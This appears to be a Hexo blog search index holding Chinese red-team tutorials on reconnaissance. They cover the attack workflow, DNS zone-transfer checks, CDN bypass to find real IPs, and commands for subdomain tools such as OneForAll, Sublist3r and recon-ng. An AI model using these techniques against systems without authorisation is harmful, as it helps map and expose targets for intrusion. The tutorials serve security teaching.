<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>信息收集流程介绍</title>
    <url>/post/d584f360.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="基本的红队测试流程介绍"><a href="#基本的红队测试流程介绍" class="headerlink" title="基本的红队测试流程介绍"></a>基本的红队测试流程介绍</h2><ol>
<li>接到项目合同并制定相应计划</li>
<li>准备相应的工具和材料</li>
<li>做第一次信息收集</li>
<li>做漏洞扫描或攻击面测试</li>
<li>针对突出的攻击面做具体的渗透</li>
<li>进入环境之后的第二次信息收集</li>
<li>提升权限</li>
<li>维持选项</li>
<li>寻找扩大攻击面的渠道</li>
<li>清理攻击痕迹</li>
<li>编写报告</li>
</ol>
<h2 id="信息收集在整个红队测试流程中的定位"><a href="#信息收集在整个红队测试流程中的定位" class="headerlink" title="信息收集在整个红队测试流程中的定位"></a>信息收集在整个红队测试流程中的定位</h2><p>每一步的攻击流程都是非常重要的。</p>
<p>如果最终达到的目的不需要某几部流程，那么就完全不用去做。</p>
<p>信息收集在整个渗透测试流程中是非常重要的步骤，是决定攻击是否成功的决定点。</p>
<p>信息收集决定之后的攻击面或漏洞扫描的范围，也决定整个攻击过程中对自己和目标的定位。</p>
<h3 id="信息收集的基本要求"><a href="#信息收集的基本要求" class="headerlink" title="信息收集的基本要求"></a>信息收集的基本要求</h3><ol>
<li>全面 做到对目标所有的业务面和非业务面的存在点进行全面信息收集。</li>
<li>准确 对收集到的信息尤其是重要信息再三确认其信息的准确性，对信息的内容所涉及的技术要点手动查看。</li>
<li>时效 对收集到的信息要注意信息产生的时间和收集到的时间，是否具有时间差，时间差能否接受，如果存在失效的信息要及时清除。</li>
<li>清晰 对收集到的信息要逻辑清晰，能清楚地分辨出各个收集到的信息之间的逻辑关系和资产之间的相对位置，对于总体目标要有清晰的资产逻辑和业务逻辑认识。</li>
<li>拓扑 对于收集到的信息要以这些为起点做拓扑再次进行信息收集。</li>
</ol>
<h3 id="信息收集的底层逻辑"><a href="#信息收集的底层逻辑" class="headerlink" title="信息收集的底层逻辑"></a>信息收集的底层逻辑</h3><p>通过各种渠道对目标已公开或未公开的信息做提取。</p>
<h3 id="信息收集的注意事项"><a href="#信息收集的注意事项" class="headerlink" title="信息收集的注意事项"></a>信息收集的注意事项</h3><p>降低被发现度、提高隐蔽性。</p>
<p>细心与耐心。</p>
<h3 id="信息收集的对象"><a href="#信息收集的对象" class="headerlink" title="信息收集的对象"></a>信息收集的对象</h3><p>根据目标的不同，目标需要什么要素运行，我们就收集什么要素。</p>
<p>比如一个web站点，需要收集的信息如下：</p>
<ul>
<li>服务器IP</li>
<li>操作系统</li>
<li>Web容器</li>
<li>端口</li>
<li>协议</li>
<li>CDN</li>
<li>HTTPS证书</li>
<li>域名</li>
<li>DNS</li>
<li>脚本语言</li>
<li>框架、CMS</li>
<li>数据库</li>
<li>负载匀衡</li>
<li>WAF</li>
<li>敏感目录</li>
<li>代码泄露</li>
</ul>
<p>一个微信小程序，需要收集的信息如下：</p>
<ul>
<li>接口</li>
<li>信任域名</li>
<li>JS、AJAX</li>
</ul>
<h3 id="信息收集的分类"><a href="#信息收集的分类" class="headerlink" title="信息收集的分类"></a>信息收集的分类</h3><p>主动信息收集</p>
<p>被动信息收集</p>
<h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><ol>
<li>第三方的信息收集机构或者平台已经收集到目标的信息</li>
<li>第三方的信息收集机构或者平台将信息存储在某处</li>
<li>攻击者从存储信息的地方查询信息</li>
<li>攻击者得到相应信息</li>
</ol>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>优点：</p>
<ol>
<li>隐蔽性高，不容易被发现</li>
<li>收集的信息量和覆盖面比较大</li>
</ol>
<p>缺点：</p>
<ol>
<li>收集到信息的时效性或准确性不高</li>
<li>无法收集到敏感或者未公开的信息</li>
</ol>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>被动信息收集在实战中非常常用，尤其是在网络安全攻防对抗中，我们通常见到的各种渗透流程也会经常使用被动信息收集，比如通过被动信息收集获得目标的基本要素，然后根据信息要素判断特定并分析脆弱点，最后根据脆弱点针对性地做下一步的攻击活动。</p>
<h3 id="实战中的被动信息收集是怎么做的"><a href="#实战中的被动信息收集是怎么做的" class="headerlink" title="实战中的被动信息收集是怎么做的"></a>实战中的被动信息收集是怎么做的</h3><p><strong>多工具、多平台、分布式</strong>。结合这三点的大型信息收集综合项目，并且收集到的信息会集中整合和自动化的分析处理。</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>域名_IP收集方式</title>
    <url>/post/efd52af7.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>nslookup命令用于查询DNS的记录,查看域名解析是否正常。</p>
<p>Windows和Kali Linux均内置</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure>



<h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><p>Dig是一个在类Unix命令行模式下查询DNS包括NS记录,A记录,MX记录等相关信息的工具。</p>
<p>Kali Linux内置工具</p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig baidu.com			<span class="comment">#显示域名记录</span></span><br><span class="line">dig 114.114.114.114		<span class="comment">#通过ip地址反查DNS域名</span></span><br><span class="line">dig txt chaos VERSION.BIND @ns.dnsv4.com	<span class="comment">#查询DNS服务器的bind信息</span></span><br><span class="line">dig @dns.xxx.edu.cn axfr xxx.edu.cn			<span class="comment">#查询是否存在DNS区域传输</span></span><br></pre></td></tr></table></figure>



<h3 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a>dnsenum</h3><p>一款用于收集 dns 信息的工具,这款工具通过字典爆破、搜索引擎、whois 查询、区域传输等手段用于获取域名背后的 dns 信息。</p>
<p>Kali Linux内置工具</p>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnsenum baidu.com     </span><br></pre></td></tr></table></figure>



<h3 id="dnswalk"><a href="#dnswalk" class="headerlink" title="dnswalk"></a>dnswalk</h3><p>利用DNS区域传输技术来获取DNS对应域名A记录。可以用来检验区域传输漏洞。</p>
<p>注意：使用时要在域名后面加一个点。</p>
<p>Kali Linux内置工具</p>
<h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnswalk baidu.com.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>扩展：DNS区域传输漏洞</p>
<p>DNS区域传输（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。一般来说，DNS区域传输操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的因特网用户执行DNS区域传输（zone transfer）操作是后果最为严重的错误配置之一。</p>
<p>区域传输漏洞的危害：黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，黑客可以绕过基于网络的访问控制。</p>
</blockquote>
<h3 id="DNS在线查询"><a href="#DNS在线查询" class="headerlink" title="DNS在线查询"></a>DNS在线查询</h3><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com</a></p>
<p><a href="https://www.nslookup.io/">https://www.nslookup.io/</a></p>
<p><a href="http://tool.chinaz.com/dns/">http://tool.chinaz.com/dns/</a></p>
<p><a href="https://dnslytics.com/">https://dnslytics.com/</a></p>
<h2 id="Whois与ICP备案"><a href="#Whois与ICP备案" class="headerlink" title="Whois与ICP备案"></a>Whois与ICP备案</h2><h3 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h3><p>Whois是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令列接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。</p>
<h4 id="Web接口查询"><a href="#Web接口查询" class="headerlink" title="Web接口查询"></a>Web接口查询</h4><p><a href="http://whois.aliyun.com/">http://whois.aliyun.com</a></p>
<p><a href="http://www.whois365.com/cn/">http://www.whois365.com/cn/</a></p>
<p><a href="http://whois.chianz.com/">http://whois.chianz.com/</a></p>
<p><a href="http://whois.aizhan.com/">http://whois.aizhan.com/</a></p>
<h4 id="Whois命令查询"><a href="#Whois命令查询" class="headerlink" title="Whois命令查询"></a>Whois命令查询</h4><p>Kali linux自带whois查询工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whois baidu.com</span><br></pre></td></tr></table></figure>



<h3 id="ICP备案"><a href="#ICP备案" class="headerlink" title="ICP备案"></a>ICP备案</h3><p>ICP，Internet Content Provider，中文全称：网络内容提供商。ICP可以理解为向广大用户提供互联网信息业务和增值业务的电信运营商，是经国家主管部门批准的正式运营企业或部门。</p>
<p>《互联网信息服务管理办法》指出互联网信息服务分为经营性和非经营性两类。国家对经营性互联网信息服务实行许可制度；对非经营性互联网信息服务实行备案制度。未取得许可或者未履行备案手续的，不得从事互联网信息服务。</p>
<p>ICP备案查询方法：</p>
<p><a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a> （ICP备案查询网）</p>
<p><a href="http://www.beian.miit.gov.cn/publish/query/indexFirst.action">http://www.beian.miit.gov.cn/publish/query/indexFirst.action</a> （工业和信息化部）</p>
<p><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> （天眼查）</p>
<p><a href="http://icp.chinaz.com/">http://icp.chinaz.com</a> （站长工具）</p>
<p><a href="http://cha.fute.com/index">http://cha.fute.com/index</a> （域名助手备案信息查询）</p>
<h3 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a>IP反查域名</h3><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
<h2 id="AS号码查询"><a href="#AS号码查询" class="headerlink" title="AS号码查询"></a>AS号码查询</h2><p>自治系统(Autonomous System)是指使用统一内部路由协议的一组网络。 如果成员单位的网络路由器准备采用EGP（Exterior Gateway Protocol） BGP（Border Gateway Protocol）或 IDRP（OSI Inter-Domain Routing Protocol）协议，可以申请AS号码。 一般如果该单位的网络规模比较大或者将来会发展成较大规模的网络， 而且有多个出口，建议建立成一个自治系统，这样就需要AS号码。 如果网络规模较小，或者规模较为固定，而且只有一个出口， 可采用静态路由或其它路由协议，这样就不需要AS号码。</p>
<h3 id="在线查询"><a href="#在线查询" class="headerlink" title="在线查询"></a>在线查询</h3><p><a href="https://bgp.he.net/">https://bgp.he.net/</a></p>
<h3 id="Nmap脚本查询"><a href="#Nmap脚本查询" class="headerlink" title="Nmap脚本查询"></a>Nmap脚本查询</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --script targets-asn -cript-args targets-asn.asn=45062</span><br></pre></td></tr></table></figure>

<p>可以先通过网站在线查询某公司的ASN，然后用Nmap脚本查询。</p>
<h2 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h2><p>证书透明度（CT）日志按设计包含由参与CA为任何给定域颁发的所有证书。SSL/TLS证书一般包含域名、子域名和电子邮件地址。这些日志是公开可用的，任何人都能看到这些日志。这使它们成为攻击者的信息宝库。</p>
<p>常用的查询CT的网站：</p>
<p><a href="https://crt.sh/">https://crt.sh/</a></p>
<p><a href="https://search.censys.io/certificates">https://search.censys.io/certificates</a></p>
<p><a href="https://transparencyreport.google.com/https/certificates">https://transparencyreport.google.com/https/certificates</a></p>
<h2 id="C段与旁注"><a href="#C段与旁注" class="headerlink" title="C段与旁注"></a>C段与旁注</h2><p>当渗透网站不存在漏洞或无法以成功渗透的情况下,这时可以采用旁注或C段思路进行渗透。</p>
<ul>
<li>C段：同网段不同服务器的渗透方案</li>
<li>旁注：同服务器不同站点的渗透方案</li>
</ul>
<p>常用Web工具</p>
<p><a href="https://chapangzhan.com/">https://chapangzhan.com/</a></p>
<p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p>
<h2 id="CDN的绕过"><a href="#CDN的绕过" class="headerlink" title="CDN的绕过"></a>CDN的绕过</h2><h3 id="什么是CDN"><a href="#什么是CDN" class="headerlink" title="什么是CDN"></a>什么是CDN</h3><p>CDN的全称Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p>
<p><img src="https://i.loli.net/2021/10/16/kuRNSU647JdDQt3.jpg" alt="CDN"></p>
<h3 id="如何知道该站点是否存在CDN？"><a href="#如何知道该站点是否存在CDN？" class="headerlink" title="如何知道该站点是否存在CDN？"></a>如何知道该站点是否存在CDN？</h3><p>使用超级ping：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
<p>若存在多个响应ip，则说明存在CDN</p>
<h3 id="如何绕过CDN获取真实ip"><a href="#如何绕过CDN获取真实ip" class="headerlink" title="如何绕过CDN获取真实ip"></a>如何绕过CDN获取真实ip</h3><ul>
<li><p>利用子域名请求获取真实ip</p>
<p>很多网站出于经济考虑，只对主站做CDN服务，可以从子域名入手获取真实ip</p>
</li>
<li><p>利用国外地址请求获取真实ip</p>
<p>很多国内公司不会把CDN节点放在国外</p>
</li>
<li><p>利用第三方接口查询获取真实ip</p>
<p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p>
<p><a href="https://site.ip138.com/">https://site.ip138.com/</a>    （查看ip历史解析记录）</p>
</li>
<li><p>利用邮件服务器接口获取真实ip</p>
<p>一般不会对内部邮箱服务器做CDN服务</p>
</li>
<li><p>利用黑暗搜索引擎特定文件获取真实ip</p>
<p>如：查找ico图标文件：</p>
<ul>
<li><p>shodan—— http.favicon.hash:xxxxx</p>
</li>
<li><p>fofa—— icon_hash=xxxxxx</p>
</li>
</ul>
</li>
<li><p>遗留文件</p>
<p>如：phpinfo.php 会记录ip地址信息</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>子域名挖掘工具</title>
    <url>/post/fb6104a2.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h2><p>Layer子域名挖掘机是一款域名查询工具，可提供网站子域名查询服务。拥有简洁的界面、简单的操作模式，支持服务接口、暴力搜索、同服挖掘三种模式，支持打开网站、复制域名、复制IP、复制CDN、导出域名、导出IP、导出域名+IP、导出域名+IP+WEB服务器以及导出存活网站！<img src="https://i.loli.net/2021/10/05/ufoXJeBp8cThPYR.png" alt="bf99b7e2c5e77cff30bd9e2f57d8e476.png"></p>
<p>用法就不用多解释了，图形化界面简单易上手，信息收集必备神器！</p>
<h2 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h2><p>Maltego是一款非常优秀的信息收集工具。与其他工具相比，不仅功能强大，而且自动化水平非常高，不需要复杂的命令，就能轻松的完成信息收集。</p>
<p><img src="https://i.loli.net/2021/10/05/3Wf6IjMU9GRYtEB.png" alt="39116d8f36bb288559e80364a25d1238.png"></p>
<p>账号注册与使用教程： <a href="https://blog.csdn.net/smli_ng/article/details/105943189">https://blog.csdn.net/smli_ng/article/details/105943189</a></p>
<p>maltego插件开发：<a href="https://www.freebuf.com/sectool/207378.html">https://www.freebuf.com/sectool/207378.html</a></p>
<h2 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h2><p>OneForAll是一款功能强大的子域收集工具</p>
<p>详细介绍：<a href="https://paper.seebug.org/1053/">https://paper.seebug.org/1053/</a></p>
<h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/shmilylty/OneForAll.git</span><br><span class="line"></span><br><span class="line">python3 -m pip install --user -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">pip3 install --user -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> OneForAll</span><br><span class="line"></span><br><span class="line">python3 oneforall.py --<span class="built_in">help</span>            <span class="comment">#查看帮助菜单</span></span><br><span class="line"></span><br><span class="line">python3 oneforall.py --target example.com run</span><br></pre></td></tr></table></figure>

<h2 id="JSFinder"><a href="#JSFinder" class="headerlink" title="JSFinder"></a>JSFinder</h2><p>JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。</p>
<p>详细介绍：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p>
<h3 id="下载使用"><a href="#下载使用" class="headerlink" title="下载使用"></a>下载使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Threezh1/JSFinder.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> JSFinder/</span><br><span class="line"></span><br><span class="line">python3 JSFinder.py -u http://www.baidu.com         <span class="comment">#简单爬取</span></span><br><span class="line"></span><br><span class="line">python3 JSFinder.py -u http://www.baidu.com -d       <span class="comment">#深度爬取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#建议使用-ou 和 -os来指定保存URL和子域名的文件名。</span></span><br><span class="line">python3 JSFinder.py -u http://www.mi.com -d -ou mi_url.txt -os mi_subdomain.txt </span><br><span class="line"></span><br><span class="line">python3 JSFinder.py -f url.txt                         <span class="comment">#批量指定url</span></span><br><span class="line"></span><br><span class="line">python3 JSFinder.py -f js.txt -j                       <span class="comment">#批量指定js</span></span><br></pre></td></tr></table></figure>

<h2 id="subDomainsBrute"><a href="#subDomainsBrute" class="headerlink" title="subDomainsBrute"></a>subDomainsBrute</h2><p>高并发的DNS暴力枚举工具。</p>
<p>详细介绍：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p>
<h3 id="下载安装-1"><a href="#下载安装-1" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lijiejie/subDomainsBrute.git</span><br><span class="line"></span><br><span class="line">pip3 install aiodns</span><br></pre></td></tr></table></figure>

<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> subDomainsBrute</span><br><span class="line"></span><br><span class="line">python3 subDomainsBrute.py -t 10 baidu.com -o baidu.txt</span><br></pre></td></tr></table></figure>

<h2 id="Sublist3r"><a href="#Sublist3r" class="headerlink" title="Sublist3r"></a>Sublist3r</h2><p>Sublist3rsublist3r是一款python开发的子域名枚举工具,通过各种搜索引擎 (例如Google,Yahoo,Bing,Baidu和Ask)枚举子域。Sublist3r还使用Netcraft，Virustotal，ThreatCrowd，DNSdumpster和ReverseDNS枚举子域。也集合了subbrute的暴力枚举功能。</p>
<h3 id="下载安装-2"><a href="#下载安装-2" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/aboul3la/Sublist3r.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> Sublist3r/</span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>

<h3 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sublist3r.py -d baidu.com		<span class="comment">#扫描子域名</span></span><br><span class="line"></span><br><span class="line">python3 sublist3r.py -b -d baidu.com	<span class="comment">#暴力枚举子域名</span></span><br></pre></td></tr></table></figure>

<h2 id="theHarvester"><a href="#theHarvester" class="headerlink" title="theHarvester"></a>theHarvester</h2><p>Kali Linux内置工具</p>
<p>theHarvester是一款信息收集工具，它可以从不同的公开源中(例如：搜索引擎和PGP key服务器)收集e -mail账户信息，用户名称和主机名/子域名等。theHarvester目的是帮助渗透测试人员在早期阶段尽可能的收集一些信息。这个工具十分简单但非常有效。</p>
<h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h3><ul>
<li>-l 限制并发搜索结果</li>
<li>-b 指定搜索引擎(google，pgp，bing，baidu等)</li>
<li>-d 指定搜索对象</li>
<li>-h 使用Shodan数据库去搜索主机</li>
</ul>
<h3 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains theHarvester -d 163.com -l 500 -b google</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：使用google作为搜索引擎需要使用proxychains代理进行“科学上网”</p>
</blockquote>
<h2 id="recon-ng"><a href="#recon-ng" class="headerlink" title="recon-ng"></a>recon-ng</h2><p>Kali Linux内置工具=</p>
<p>recon-ng是功能齐全的recon-ng框架，其目的是提供一个强大的环境，以快速，彻底地进行基于Web的开源侦查。recon-ng的使用方法和 Metasploit Framewor非常的相似。</p>
<blockquote>
<p>注：运行时需要使用proxychains代理进行“科学上网”</p>
</blockquote>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><ul>
<li>back 返回上一级</li>
<li>dashboard 显示活动的总结</li>
<li>db 工作区的数据库页面</li>
<li>exit 退出recon-ng</li>
<li>help 帮助信息</li>
<li>index 创造一个模块</li>
<li>keys 管理第三方的api接口</li>
<li>marketplace 应用市场</li>
<li>modules 已经安装的模块</li>
<li>option 管理当前文本的选项</li>
<li>pdb 打开python进行调试</li>
<li>script 记录并执行命令脚本</li>
<li>shell 执行操作系统命令</li>
<li>show 显示各种框架的条目</li>
<li>snapshots 管理一个快照</li>
<li>spool 将结果输出到一个文件里</li>
</ul>
<h3 id="初始化安装模块"><a href="#初始化安装模块" class="headerlink" title="初始化安装模块"></a>初始化安装模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains recon-ng</span><br><span class="line"></span><br><span class="line">marketplace install all</span><br></pre></td></tr></table></figure>

<h3 id="模块子命令"><a href="#模块子命令" class="headerlink" title="模块子命令"></a>模块子命令</h3><ul>
<li>modules load 加载某个模块</li>
<li>modules reload 退出某个模块</li>
<li>modules search 搜索某个模块</li>
</ul>
<h3 id="示例-查询子域名"><a href="#示例-查询子域名" class="headerlink" title="示例-查询子域名"></a>示例-查询子域名</h3><p>1、搜索要用到的模块（recon-ng利用浏览器进行查询，也支持暴力破解）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules search bing（这里使用bing搜索引擎搜索，也支持其他浏览器）</span><br></pre></td></tr></table></figure>

<p>2、然后装载模块（进行子域名查询）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules load recon/domains-hosts/bing_domain_web</span><br></pre></td></tr></table></figure>

<p>3、查看我们需要配置的列表并进行配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options list</span><br><span class="line"></span><br><span class="line">options set source baidu.com</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：选项子命令</p>
<ul>
<li>options list 选项列表</li>
<li>options set 参数名称 参数值 （配置选项内容）</li>
<li>options unset 参数名称 （清除配置的内容）</li>
</ul>
</blockquote>
<p>4、然后运行模块，进行查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>

<p>5、查询结果保存在recon-ng的数据库的hosts表中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show hosts</span><br></pre></td></tr></table></figure>

<h3 id="示例-域名解析"><a href="#示例-域名解析" class="headerlink" title="示例-域名解析"></a>示例-域名解析</h3><p>1、我们要调用另一个模块并且查看选项列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules load recon/hosts-hosts/resolve</span><br><span class="line"></span><br><span class="line">options list</span><br></pre></td></tr></table></figure>

<p>2、我们要查询hosts表中的子域名的IP地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options set source query select host from hosts</span><br></pre></td></tr></table></figure>

<p>3、运行之后我们去hosts查看结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br><span class="line"></span><br><span class="line">show hosts</span><br></pre></td></tr></table></figure>

<h3 id="示例-生成报告"><a href="#示例-生成报告" class="headerlink" title="示例-生成报告"></a>示例-生成报告</h3><p>1、搜索要用到的模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules search report</span><br></pre></td></tr></table></figure>

<p>2、转载报告模块并查看列表选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules load reporting/html</span><br><span class="line"></span><br><span class="line">options list</span><br><span class="line"></span><br><span class="line">options set CREATOR plumeria</span><br><span class="line"></span><br><span class="line">options set CUSTOMER baidu</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>3、运行模块后就可以在生成的目录下查看文件</p>
<h2 id="SubFinder-KSubdomain-HttpX"><a href="#SubFinder-KSubdomain-HttpX" class="headerlink" title="SubFinder + KSubdomain + HttpX"></a>SubFinder + KSubdomain + HttpX</h2><ul>
<li><strong>SubFinder</strong>：用来查询域名的子域名信息的工具，可以使用很多国外安全网站的api接口进行自动化搜索子域名信息。<ul>
<li><a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></li>
</ul>
</li>
<li><strong>HttpX</strong>：一款运行速度极快的多功能HTTP安全工具，它可以使用retryablehttp库来运行多种网络探针，并使用了多线程机制来维持运行的稳定性和结果的准确性。<ul>
<li><a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
</ul>
</li>
<li><strong>ksubdomain</strong>是一款基于无状态子域名爆破工具，支持在Windows/Linux/Mac上使用，它会很快的进行DNS爆破，在Mac和Windows上理论最大发包速度在30w/s,linux上为160w/s的速度。<ul>
<li><a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></li>
</ul>
</li>
</ul>
<h3 id="安装go环境"><a href="#安装go环境" class="headerlink" title="安装go环境"></a>安装go环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载go环境</span></span><br><span class="line">wget -c https://storage.googleapis.com/golang/go1.15.11.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#解压到/usr/local/目录下</span></span><br><span class="line">tar -C /usr/<span class="built_in">local</span>/ -zxvf go1.15.11.linux-amd64.tar.gz   </span><br><span class="line"></span><br><span class="line"><span class="comment">#配置环境</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="comment">#添加如下内容后保存：</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/go/bin</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行以下命令，使环境变量立即生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看go版本</span></span><br><span class="line">go version</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置go开发中的环境变量</span></span><br><span class="line">go env -w GOPROXY=https://goproxy.io,direct</span><br><span class="line"></span><br><span class="line">go env -w GO111MODULE=on</span><br></pre></td></tr></table></figure>

